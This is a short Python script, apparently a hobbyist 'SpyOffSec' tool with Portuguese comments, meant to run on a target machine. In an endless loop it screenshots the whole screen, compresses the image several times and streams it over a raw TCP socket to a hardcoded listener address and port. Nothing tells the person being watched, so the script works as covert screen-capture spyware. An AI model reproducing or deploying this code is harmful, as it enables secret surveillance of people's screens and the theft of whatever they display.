#-*-coding: utf8-*-

'''
	@Author: Daniel Victor Freire Feitosa
	@Version: 2.0.0

	Github: https://github.com/proxyanon/
	Twiiter: @DanielFreire00
	Youtube: Proxy Sec


	Esse script vai na maquina que vai ser visualizada
'''

import socket
from PIL import Image
from zlib import compress
from platform import system

if system() == "Windows":
	from PIL import ImageGrab, Image
else:
	import pyscreenshot as ImageGrab
	from PIL import Image

ip = '192.168.1.62'
port = 666

class SpyOffSec():

	def __init__(self, ip, port, img_name='temp.jpg'):
		self.ip = ip
		self.port = int(port)
		self.img_name = img_name

	def screen_recorder(self): # Esse funcao vai no cliente
		image = ImageGrab.grab(bbox=(0, 0, 1360, 768)) # tirando o print do tela inteira		
		resize = image.resize((600, 400), Image.ANTIALIAS) # resize para 800x500
		resize.save(self.img_name, 'JPEG', quality=40, optimize=False, progressive=False) # salva e diminui consideralvelmente a qualidade
		resize.close()

	def image_to_string(self):
		self.screen_recorder()
		handle = open(self.img_name, 'rb')
		read = handle.read()
		handle.close()

		return read

	def compress_image(self):
		string = self.image_to_string()
		compressed = compress(compress(compress(compress(string, 9), 9), 9), 9)

		return compressed

	def image_split(self, string):
		result = []
		part1 = string[0:len(string)/2]
		part2 = string[len(part1):len(string)]
		result.append({'part1': part1, 'part2': part2})

		return result

	def run(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((self.ip, self.port))
		compressed = self.compress_image()

		s.send("LEN:{nbytes}".format(nbytes=len(compressed)))
		resp = s.recv(1024)

		if resp == "OK":
			s.send(compressed)
		else:
			s.send("FAIL")

app = SpyOffSec(ip, port)

while True:
	app.run()